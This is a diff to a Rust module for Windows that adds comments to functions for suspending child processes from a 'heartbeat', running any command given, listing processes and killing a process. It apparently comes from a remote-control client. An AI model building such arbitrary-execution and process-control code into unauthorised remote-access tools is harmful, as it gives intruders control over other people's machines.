@@ -1,5 +1,9 @@
 mod ps_helper;
 
+/*
+    This function is used in the heartbeat function and it controls the child processes of the client process
+    Reusme or Stop the child processes.
+*/
 pub fn control_child_processes(suspend_flag: bool) -> windows::core::Result<()>{
 
     let current_pid: u32 = std::process::id();
@@ -20,6 +24,7 @@ pub fn control_child_processes(suspend_flag: bool) -> windows::core::Result<()>{
     Ok(())
 }
 
+// Run any command the user want 
 pub fn run_exec(exec_file_name: &str, args: &str) {
 
     std::process::Command::new(exec_file_name)
@@ -28,6 +33,7 @@ pub fn run_exec(exec_file_name: &str, args: &str) {
     .expect(format!("[-] Process Creation Error: {}", std::io::Error::last_os_error()).as_str());
 }
 
+// List are the runnning processes on the machine (similar to ps)
 pub fn process_list() -> String {
 
     let task_list: tasklist::Tasklist = tasklist::Tasklist::new().unwrap();
@@ -78,6 +84,7 @@ pub fn process_list() -> String {
     task_list_buffer
 }   
 
+// Is it not obvious?
 pub fn process_kill(process_id: u32) -> String {
     
     let task_list: tasklist::Tasklist = match tasklist::Tasklist::new() {
